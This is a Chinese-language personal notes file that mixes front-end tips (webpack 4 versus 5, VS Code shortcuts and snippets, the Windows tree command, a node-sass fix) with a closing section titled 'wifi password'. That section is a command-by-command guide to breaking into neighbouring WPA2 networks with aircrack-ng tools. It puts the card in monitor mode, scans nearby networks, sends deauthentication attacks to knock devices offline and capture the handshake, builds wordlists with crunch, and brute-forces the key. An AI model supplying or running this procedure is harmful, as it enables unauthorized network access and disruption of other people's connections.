#  记录  学习  、 工作  日常笔记 

##  webpack4 和 5 的一些区别 
 
1. webpack5 内置图片处理 只需要做配置即可使用 
2. 内置清空上次打包内容  ，在output中配置clearn：true 

## vscode注释的快捷键：
“Ctrl + /”和“Alt+Shift+A”。vscode中进行注释的方法：1、单行注释，使用“Ctrl + /”，或者先按“CTRL+K”，再按“CTRL+U”；2、块注释，使用“Alt+Shift+A”。

## vscode 用户自定义代码的设置方法
1. ctrl+shift+P 
2. 选择Preferences: Configure User Snippets 
3. 在html.json, javascript.json, javascriptbabel.json里都设置一下~

## 输出目录树 
tree [drive][path] [/F] [/A]
#/f 显示所有目录及目录下的所有文件，省略时，只显示目录，不显示目录下的文件
#/a 使用ASCII字符，而不使用扩展字符

使用案例：
1. 把D盘nodejs目录下的目录及文件目录树输出到D盘的result.txt文件
tree D:\nodejs /f > D:result.txt
2. 生成当前目录树 输出到 result.text
tree /f > result.text

## Node Sass could not find a binding for your current environment: Windows 64-bit with Node.js 12.x 
出现上述问题原因：node版本与node-sass版本不匹配导致，由于我对node版本升级，原来的node-sass版本过低。 
1. npm rebuild node-sass
2. npm update
3. 重新启动项目，即可解决

## wifi密码
1. sudo -i 
2. ifconfig
3. airmon-ng  
4. airmon-ng start wlan0  发起监听网卡
5. ifconfig
6. airodump-ng wlan0mon 扫描周边wifi（wlan0mon是上一步ifconfig查询出来的网卡名）
扫描出来的大概信息为 ： 
BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                                                                                                                                                                                                                                                                                                                      
 08:60:83:A4:88:90  -58        3      147   20   3  130   WPA2 CCMP   PSK  CMCC-2EFH                                                                                                                              
 EC:6C:B5:98:CA:40  -61        9       11    0   9  130   WPA2 CCMP   PSK  CMCC-208
扫描出来的wifi信息 原来抓包 ，需要用到bssid（mac地址）  和 ch （频段） 
7. 抓包到handshake （被动的抓包模式 需要有用户上下线 ，所以我们使用另外更快的方法,可以促进它加速完成）
airodump-ng -c 9 --bssid EC:6C:B5:98:CA:40  -w /home/kail/桌面/handshake wlan0mon

8. 使用ack死亡攻击 踢下线 ，WiFi有自动登入功能，重新登录我们就可以立马抓到包了

aireplay-ng -0 10 -a EC:6C:B5:98:CA:40 -c 30:03:C8:3B:D7:C7 wlan0mon 

    0 代表下线; 10 代表攻击10次 ; -a后面是mac地址 ;-c后面是我们上一步抓包的STATION ，代表设备

当抓包的终端头部出现 ...WPA handshake: EC:6C:B5:98:CA:40...  代表我们抓包成功了！
会在桌面上生成4-5个文件 ， 我们主要用到.cap文件
9.  准备字典  使用crunch工具进行 字典生成  优化规则
/usr/share/crunch/ 找到定义好的字符集  
1. 28.lalpha-numeric                = [abcdefghijklmnopqrstuvwxyz0123456789]
2. 40.mixalpha-numeric-all       = [abcdefghijklmnopqrstuvwxypqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]

执行生成命令 :
crunch 8 8 /usr/share/crunch/charset.lst lalpha-numeric 
根据字符集生成密码 -o START 路径.txt 可以输出文件
表示 生成最短8个 最长8个 指定字符集规则的文件
crunch 8 8 /usr/share/crunch/charset.lst mixalpha-numeric-all

crunch 8 8 /usr/share/crunch/charset.lst mixalpha-numeric-all -b 1gb -o START /home/kail/
//生成指定字符串
crunch 8 8 abcdefghijklmnopqrstuvwxypqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -b 1gb -o START /home/kail/

crunch 8 8 abcdefghijklmnopqrstuvwxypqrstuvwxyz0123456789 -d 1 -b 1gb -o START /home/kail/

crunch 8 8 0123456789 -b 1gb -o START /home/kail/

10. 暴力破解 

跑本地字典 ： 
aircrack-ng -w /home/kail/passwords-1.txt -b EC:6C:B5:98:CA:40 /home/kail/桌面/handshake-0*.cap

aircrack-ng -w /root/00000000-99999999.txt -b EC:6C:B5:98:CA:40 /home/kail/桌面/handshake-0*.cap
跑生成的字典 ： 



    -w 后面是我们放在桌面的字典  -b后面是BSSID地址  以及我们抓包的文件地址